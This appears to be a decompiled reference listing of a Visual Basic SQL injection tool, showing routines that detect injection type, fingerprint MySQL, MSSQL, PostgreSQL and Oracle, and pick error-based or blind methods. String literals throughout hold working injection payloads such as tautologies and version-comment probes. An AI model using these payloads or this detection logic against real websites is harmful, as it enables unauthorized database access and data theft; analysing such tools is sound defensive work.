'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrCmp
'N  * ref: __vbaStrVarCopy
'N  * ref: __vbaStrCmp
'N  * ref: "Retying to find string column"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: "Finding string column"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaVarForInit
'N  * ref: "Finding string column: "
'N  * ref: Subr_143
'N  * ref: __vbaStrCopy
'N  * ref: Subr_156
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeVar
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStr
'N  * ref: LCase(
'N  * ref: __vbaInStrVar
'N  * ref: __vbaVarTstGt
'N  * ref: __vbaVarForNext
'N  * ref: __vbaI2Var
'N  * ref: "Valid String Column is "
'N  * ref: Subr_143
'N  * ref: "%String_Col%"
'N  * ref: __vbaVarDup
'N  * ref: Subr_156
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrCmp
'N  * ref: __vbaStrVarCopy
'N  * ref: __vbaStrCmp
'N  * ref: "Cannot find string column!"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaExitProc
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStr
'N  * ref: __vbaErrorOverflow
'End Sub
 
'Sub Subr_158()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaOnError
'N  * ref: Subr_184
'N  * ref: __vbaStrMove
'N  * ref: IsNumeric(
'N  * ref: "9999"
'N  * ref: __vbaVarDup
'N  * ref: IIf(
'N  * ref: " "
'N  * ref: Subr_184
'N  * ref: " 1=1"
'N  * ref: __vbaStrCat
'N  * ref: " "
'N  * ref: " "
'N  * ref: "x"
'N  * ref: "="
'N  * ref: "x"
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: IIf(
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaInStr
'N  * ref: __vbaVarMove
'N  * ref: __vbaVarCopy
'N  * ref: __vbaStrCmp
'N  * ref: "Finding data base type"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVar
'N  * ref: __vbaInStr
'N  * ref: __vbaVarMove
'N  * ref: Subr_139
'N  * ref: __vbaVarMove
'N  * ref: __vbaStrVarCopy
'N  * ref: "MySQL"
'N  * ref: __vbaStrCmp
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarAnd
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCopy
'N  * ref: "/*!30000 "
'N  * ref: "*/"
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaInStr
'N  * ref: "MySQL"
'N  * ref: __vbaStrCopy
'N  * ref: __vbaStrCmp
'N  * ref: __vbaStrCopy
'N  * ref: "/*!40100 "
'N  * ref: "*/"
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaInStr
'N  * ref: "MySQL >=4.1"
'N  * ref: __vbaStrCopy
'N  * ref: __vbaStrCopy
'N  * ref: "/*!50000 "
'N  * ref: "*/"
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaInStr
'N  * ref: Subr_185
'N  * ref: Subr_184
'N  * ref: __vbaStrCopy
'N  * ref: " "
'N  * ref: " 1=/*!30000 1*/ and "
'N  * ref: "x"
'N  * ref: "="
'N  * ref: "x"
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaInStr
'N  * ref: "MySQL"
'N  * ref: __vbaStrCopy
'N  * ref: __vbaStrCmp
'N  * ref: Subr_185
'N  * ref: Subr_184
'N  * ref: __vbaStrCopy
'N  * ref: " "
'N  * ref: " 1=/*!40100 1*/ and "
'N  * ref: "x"
'N  * ref: "="
'N  * ref: "x"
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaInStr
'N  * ref: "MySQL >=4.1"
'N  * ref: __vbaStrCopy
'N  * ref: Subr_185
'N  * ref: Subr_184
'N  * ref: __vbaStrCopy
'N  * ref: " "
'N  * ref: " 1=/*!50000 1*/ and "
'N  * ref: "x"
'N  * ref: "="
'N  * ref: "x"
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaInStr
'N  * ref: "MySQL >=5"
'N  * ref: __vbaStrCopy
'N  * ref: __vbaStrCmp
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarAnd
'N  * ref: __vbaVarAnd
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCopy
'N  * ref: Subr_185
'N  * ref: " "
'N  * ref: Subr_184
'N  * ref: " 1::int=1"
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaStrCopy
'N  * ref: Subr_185
'N  * ref: " "
'N  * ref: Subr_184
'N  * ref: " 1::int=1 and "
'N  * ref: "x"
'N  * ref: "="
'N  * ref: "x"
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaInStr
'N  * ref: "PostgreSQL"
'N  * ref: __vbaStrCopy
'N  * ref: __vbaStrCopy
'N  * ref: Subr_185
'N  * ref: " "
'N  * ref: Subr_184
'N  * ref: " rownum=rownum"
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaStrCopy
'N  * ref: Subr_185
'N  * ref: " "
'N  * ref: Subr_184
'N  * ref: " rownum=rownum and "
'N  * ref: "x"
'N  * ref: "="
'N  * ref: "x"
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaInStr
'N  * ref: "Oracle"
'N  * ref: __vbaStrCopy
'N  * ref: __vbaStrCmp
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: "DB Server: "
'N  * ref: vbTab
'N  * ref: vbCrLf
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarMove
'N  * ref: IIf(
'N  * ref: __vbaI2Var
'N  * ref: "DB Server: "
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: "Can't find db server type! But maybe there be some chances! [-o<"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: LCase(
'N  * ref: Left(
'N  * ref: "msaccess"
'N  * ref: __vbaVarTstEq
'N  * ref: __vbaFreeVarList
'N  * ref: Subr_645
'N  * ref: __vbaFreeVar
'N  * ref: __vbaStrCopy
'N  * ref: Subr_170
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVar
'N  * ref: "MsAccess"
'N  * ref: __vbaVarDup
'N  * ref: Subr_169
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaExitProc
'N  * ref: "MySQL error based"
'N  * ref: __vbaStrCmp
'N  * ref: Subr_211
'N  * ref: __vbaStrVarMove
'N  * ref: Subr_212
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCmp
'N  * ref: Subr_211
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeVar
'N  * ref: "Cannot get current db name!"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaExitProc
'N  * ref: "Oracle error based"
'N  * ref: __vbaStrCmp
'N  * ref: "Please register to activate!"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaExitProc
'N  * ref: __vbaLenVar
'N  * ref: __vbaI4Var
'N  * ref: Mid(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVar
'N  * ref: "Finding current data base"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: Subr_716
'N  * ref: __vbaFreeVar
'N  * ref: __vbaStrCmp
'N  * ref: Subr_148
'N  * ref: __vbaUI1I2
'N  * ref: "Injection Syntax: "
'N  * ref: Subr_143
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCopy
'N  * ref: Subr_170
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVar
'N  * ref: __vbaExitProc
'N  * ref: "MSSQL * with error"
'N  * ref: __vbaStrLike
'N  * ref: Subr_163
'N  * ref: __vbaFreeVar
'N  * ref: __vbaStrCmp
'N  * ref: "MsSQL"
'N  * ref: __vbaStrCopy
'N  * ref: __vbaStrCopy
'N  * ref: "MsSQL error based method failed, let's try other methods..."
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarCopy
'N  * ref: "MSSQL * with error"
'N  * ref: __vbaStrLike
'N  * ref: "MsSQL with error"
'N  * ref: __vbaStrCmp
'N  * ref: __vbaStrCmp
'N  * ref: __vbaStrCopy
'N  * ref: Subr_157
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVar
'N  * ref: __vbaStrCmp
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarAnd
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVar
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: "DB Server: "
'N  * ref: vbTab
'N  * ref: vbCrLf
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: "DB Server: "
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: "MySQL*"
'N  * ref: __vbaStrLike
'N  * ref: __vbaStrCmp
'N  * ref: "Testing for MySQL error based injection method"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: Subr_211
'N  * ref: __vbaStrVarMove
'N  * ref: Subr_212
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCmp
'N  * ref: "MySQL error based"
'N  * ref: __vbaStrCopy
'N  * ref: "MySQL error based injection method can be used!"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: Subr_211
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeVar
'N  * ref: Subr_148
'N  * ref: __vbaUI1I2
'N  * ref: "Injection Syntax: "
'N  * ref: Subr_143
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCopy
'N  * ref: "MySQL error based injection method cant be used!"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: "Oracle error based"
'N  * ref: __vbaStrCmp
'N  * ref: "Please register to activate!"
'N  * ref: __vbaLenVar
'N  * ref: __vbaI4Var
'N  * ref: Mid(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVar
'N  * ref: "Oracle error based injection method can be used!"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: "Trying blind method"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: Subr_163
'N  * ref: __vbaFreeVar
'N  * ref: __vbaStrCmp
'N  * ref: __vbaStrCopy
'N  * ref: "*error*"
'N  * ref: __vbaStrLike
'N  * ref: Subr_162
'N  * ref: __vbaVarMove
'N  * ref: __vbaVarMove
'N  * ref: __vbaVarMove
'N  * ref: __vbaVarForInit
'N  * ref: __vbaI4Var
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaI4Var
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaVarSub
'N  * ref: __vbaVarPow
'N  * ref: __vbaVarAdd
'N  * ref: __vbaVarMove
'N  * ref: __vbaVarAdd
'N  * ref: __vbaVarMove
'N  * ref: __vbaVarForNext
'N  * ref: __vbaVarSub
'N  * ref: __vbaVarDiv
'N  * ref: __vbaVarMove
'N  * ref: __vbaR8Var
'N  * ref: Sqr(
'N  * ref: __vbaVarMove
'N  * ref: __vbaVarAdd
'N  * ref: __vbaVarMul
'N  * ref: __vbaVarAdd
'N  * ref: __vbaR4Var
'N  * ref: __vbaFreeVarList
'N  * ref: Round(
'N  * ref: __vbaR4Var
'N  * ref: __vbaFreeVar
'N  * ref: Subr_160
'N  * ref: Subr_163
'N  * ref: Subr_161
'N  * ref: __vbaFreeVar
'N  * ref: Subr_163
'N  * ref: __vbaStrCmp
'N  * ref: "Another try to find DB server type"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: "(select concat(version(),0x7233646D3076335F73716C5F696E6A656374696F6E))"
'N  * ref: "%String_Col%"
'N  * ref: Replace(
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVar
'N  * ref: "r3dm0v3_sql_injection"
'N  * ref: __vbaInStr
'N  * ref: "MySQL"
'N  * ref: __vbaStrCopy
'N  * ref: __vbaStrCmp
'N  * ref: "(select cast(Char(114)%2bChar(51)%2bChar(100)%2bChar(109)%2bChar(48)%2bChar(118)%2bChar(51)%2bChar(95)%2bChar(104)%2bChar(118)%2bChar(106)%2bChar(95)%2bChar(105)%2bChar(110)%2bChar(106)%2bChar(101)%2bChar(99)%2bChar(116)%2bChar(105)%2bChar(111)%2bChar(110) as nvarchar(4000)))"
'N  * ref: "%String_Col%"
'N  * ref: Replace(
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVar
'N  * ref: "r3dm0v3_hvj_injection"
'N  * ref: __vbaInStr
'N  * ref: "MSSQL no error"
'N  * ref: __vbaStrCopy
'N  * ref: __vbaStrCmp
'N  * ref: "chr(114)||chr(51)||chr(100)||chr(109)||chr(48)||chr(118)||chr(51)||chr(95)||chr(104)||chr(118)||chr(106)||chr(95)||chr(105)||chr(110)||chr(106)||chr(101)||chr(99)||chr(116)||chr(105)||chr(111)||chr(110)"
'N  * ref: "%String_Col%"
'N  * ref: Replace(
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVar
'N  * ref: "r3dm0v3_hvj_injection"
'N  * ref: __vbaInStr
'N  * ref: "Oracle"
'N  * ref: __vbaStrCopy
'N  * ref: __vbaStrCmp
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: "DB Server: "
'N  * ref: vbTab
'N  * ref: vbCrLf
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: "DB Server: "
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCmp
'N  * ref: "Can not detect data base! Please choose a data base."
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaExitProc
'N  * ref: LCase(
'N  * ref: __vbaStrCmp
'N  * ref: Left(
'N  * ref: "mssql"
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarAnd
'N  * ref: __vbaVarOr
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVarList
'N  * ref: Subr_163
'N  * ref: __vbaFreeVar
'N  * ref: __vbaStrCmp
'N  * ref: "Can't find DB server type! this kind of injection not supported in this version!"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaVarAnd
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVar
'N  * ref: __vbaStrCmp
'N  * ref: "Can't find db server type :("
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: "Can't find column count! (make sure input value returns a normal response not a 404 or redirect!)"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: "It seems that input parameter is not effective! Check the following:"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: vbTab
'N  * ref: "Are you sure input parameter really exist?!"
'N  * ref: Subr_143
'N  * ref: vbTab
'N  * ref: "Are you sure the input value '"
'N  * ref: "' is valid?"
'N  * ref: Subr_143
'N  * ref: __vbaFreeStrList
'N  * ref: "GET"
'N  * ref: __vbaVarDup
'N  * ref: "POST"
'N  * ref: __vbaVarDup
'N  * ref: IIf(
'N  * ref: vbTab
'N  * ref: "Are you sure the '"
'N  * ref: "' method is correct?"
'N  * ref: __vbaVarCat
'N  * ref: Subr_143
'N  * ref: __vbaExitProc
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFPException
'End Sub
 
'Sub Subr_159()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaOnError
'N  * ref: "You haven't registered yet! Please register to use all Pro features"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaUI1Var
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaUI1I2
'N  * ref: Mid(
'N  * ref: __vbaUI1Var
'N  * ref: __vbaFreeVarList
'N  * ref: "%Inject_Here%"
'N  * ref: Replace(
'N  * ref: __vbaStrMove
'N  * ref: "Analyzing "
'N  * ref: __vbaStrCat
'N  * ref: Subr_143
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: IsNumeric(
'N  * ref: "9999"
'N  * ref: __vbaVarDup
'N  * ref: IIf(
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: LCase(
'N  * ref: Left(
'N  * ref: "http://"
'N  * ref: __vbaVarTstEq
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaVarDup
'N  * ref: " (Proxy IP)"
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrCmp
'N  * ref: IIf(
'N  * ref: "Host IP: "
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaVarCat
'N  * ref: Subr_143
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaNew2
'N  * ref: "Host IP:"
'N  * ref: vbTab
'N  * ref: vbTab
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaVarDup
'N  * ref: " (Proxy IP)"
'N  * ref: __vbaStrCmp
'N  * ref: IIf(
'N  * ref: vbCrLf
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaStrVarVal
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: "Host IP:"
'N  * ref: vbTab
'N  * ref: vbTab
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaVarDup
'N  * ref: " (Proxy IP)"
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrCmp
'N  * ref: IIf(
'N  * ref: vbCrLf
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: vbCrLf
'N  * ref: vbCrLf
'N  * ref: __vbaInStr
'N  * ref: __vbaFreeStr
'N  * ref: vbCrLf
'N  * ref: vbCrLf
'N  * ref: Split(
'N  * ref: __vbaVarIndexLoadRefLock
'N  * ref: Subr_137
'N  * ref: __vbaAryUnlock
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarCopy
'N  * ref: __vbaVarCopy
'N  * ref: __vbaStrCmp
'N  * ref: "Finding Keyword..."
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: vbCrLf
'N  * ref: vbCrLf
'N  * ref: __vbaInStr
'N  * ref: __vbaFreeStr
'N  * ref: vbCrLf
'N  * ref: vbCrLf
'N  * ref: __vbaInStr
'N  * ref: __vbaLenBstr
'N  * ref: Right(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVar
'N  * ref: __vbaStrCopy
'N  * ref: "999999.9"
'N  * ref: Subr_151
'N  * ref: __vbaFreeStr
'N  * ref: vbCrLf
'N  * ref: vbCrLf
'N  * ref: __vbaInStr
'N  * ref: __vbaFreeStr
'N  * ref: vbCrLf
'N  * ref: vbCrLf
'N  * ref: __vbaInStr
'N  * ref: __vbaLenBstr
'N  * ref: Right(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVar
'N  * ref: Subr_167
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCmp
'N  * ref: "Retrying to find keyword..."
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCopy
'N  * ref: "999999.9 or 1=1"
'N  * ref: Subr_151
'N  * ref: __vbaFreeStr
'N  * ref: vbCrLf
'N  * ref: vbCrLf
'N  * ref: __vbaInStr
'N  * ref: __vbaFreeStr
'N  * ref: vbCrLf
'N  * ref: vbCrLf
'N  * ref: __vbaInStr
'N  * ref: __vbaLenBstr
'N  * ref: Right(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVar
'N  * ref: Subr_167
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCmp
'N  * ref: __vbaStrCopy
'N  * ref: "999999.9' or 'x'='x"
'N  * ref: Subr_151
'N  * ref: __vbaFreeStr
'N  * ref: vbCrLf
'N  * ref: vbCrLf
'N  * ref: __vbaInStr
'N  * ref: __vbaFreeStr
'N  * ref: vbCrLf
'N  * ref: vbCrLf
'N  * ref: __vbaInStr
'N  * ref: __vbaLenBstr
'N  * ref: Right(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVar
'N  * ref: Subr_167
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCmp
'N  * ref: Subr_188
'N  * ref: "Keyword Found: "
'N  * ref: __vbaVarCat
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: "Can not find keyword but let me do a try!"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: Subr_188
'N  * ref: "Keyword Found: "
'N  * ref: __vbaVarCat
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: "Finding Injection type..."
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCopy
'N  * ref: " "
'N  * ref: Subr_184
'N  * ref: " 1=1"
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaStrCopy
'N  * ref: __vbaStrCopy
'N  * ref: " "
'N  * ref: Subr_184
'N  * ref: " 1>1"
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaStrCopy
'N  * ref: __vbaInStr
'N  * ref: __vbaInStr
'N  * ref: "Injection type is Integer"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCopy
'N  * ref: "' "
'N  * ref: Subr_184
'N  * ref: " 'x'='x"
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVar
'N  * ref: "' "
'N  * ref: Subr_184
'N  * ref: " 'x'='y"
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaInStr
'N  * ref: "'"
'N  * ref: __vbaStrCopy
'N  * ref: "Injection type is String (')"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCopy
'N  * ref: """" & " "
'N  * ref: Subr_184
'N  * ref: " " & """" & "x" & """" & "=" & """" & "x"
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaStrCopy
'N  * ref: __vbaStrCopy
'N  * ref: """" & " "
'N  * ref: Subr_184
'N  * ref: " " & """" & "x" & """" & "=" & """" & "y"
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaStrCopy
'N  * ref: __vbaInStr
'N  * ref: __vbaInStr
'N  * ref: """"
'N  * ref: __vbaStrCopy
'N  * ref: "Injection type is String (" & """" & ")"
'N  * ref: vbCrLf
'N  * ref: vbCrLf
'N  * ref: __vbaInStr
'N  * ref: __vbaFreeStr
'N  * ref: vbCrLf
'N  * ref: vbCrLf
'N  * ref: __vbaInStr
'N  * ref: __vbaLenBstr
'N  * ref: Right(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVar
'N  * ref: vbCrLf
'N  * ref: vbCrLf
'N  * ref: __vbaInStr
'N  * ref: __vbaFreeStr
'N  * ref: vbCrLf
'N  * ref: vbCrLf
'N  * ref: __vbaInStr
'N  * ref: __vbaLenBstr
'N  * ref: Right(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVar
'N  * ref: vbCrLf
'N  * ref: vbCrLf
'N  * ref: __vbaInStr
'N  * ref: __vbaFreeStr
'N  * ref: vbCrLf
'N  * ref: vbCrLf
'N  * ref: __vbaInStr
'N  * ref: __vbaLenBstr
'N  * ref: Right(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVar
'N  * ref: vbCrLf
'N  * ref: vbCrLf
'N  * ref: __vbaInStr
'N  * ref: __vbaFreeStr
'N  * ref: vbCrLf
'N  * ref: vbCrLf
'N  * ref: __vbaInStr
'N  * ref: __vbaLenBstr
'N  * ref: Right(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVar
'N  * ref: Subr_167
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: Subr_167
'N  * ref: __vbaVarMove
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarCmpNe
'N  * ref: __vbaVarCmpNe
'N  * ref: __vbaVarAnd
'N  * ref: __vbaVarAnd
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
'N  * ref: __vbaStrVarCopy
'N  * ref: "Injection type is Integer"
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarCmpNe
'N  * ref: __vbaVarCmpNe
'N  * ref: __vbaVarAnd
'N  * ref: __vbaVarAnd
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
'N  * ref: __vbaStrVarCopy
'N  * ref: "'"
'N  * ref: __vbaStrCopy
'N  * ref: "Injection type is String (')"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: Subr_188
'N  * ref: "Keyword corrected: "
'N  * ref: __vbaVarCat
'N  * ref: Subr_143
'N  * ref: "I guess injection type is Integer?! If injection failed, retry with a manual keyword."
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCmp
'N  * ref: "'"
'N  * ref: __vbaStrCopy
'N  * ref: __vbaStrCopy
'N  * ref: Subr_158
'N  * ref: __vbaBoolVar
'N  * ref: __vbaFreeVar
'N  * ref: LCase(
'N  * ref: Left(
'N  * ref: "msaccess"
'N  * ref: __vbaVarTstEq
'N  * ref: __vbaStrCmp
'N  * ref: __vbaStrCmp
'N  * ref: __vbaStrVarCopy
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: """"
'N  * ref: __vbaStrCopy
'N  * ref: "Reanalyzing for another string type syntax"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: Subr_158
'N  * ref: __vbaBoolVar
